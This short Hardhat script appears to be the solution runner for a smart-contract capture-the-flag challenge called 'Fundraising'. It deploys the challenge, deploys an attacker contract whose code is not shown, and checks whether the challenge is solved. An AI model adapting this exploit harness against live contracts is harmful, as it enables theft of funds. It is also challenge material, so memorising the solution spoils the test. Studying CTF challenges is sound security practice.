const { parseEther } = require("ethers/lib/utils");

async function main() {
  const SETUP = await ethers.getContractFactory("Setup");
  const EXPLOIT = await ethers.getContractFactory("FundraisingAttacker");

  const setup = await SETUP.deploy({ value: parseEther("0.000001") });
  const ctf = await ethers.getContractAt(
    "Fundraising",
    await setup.instance()
  );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address, { value: parseEther("1") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
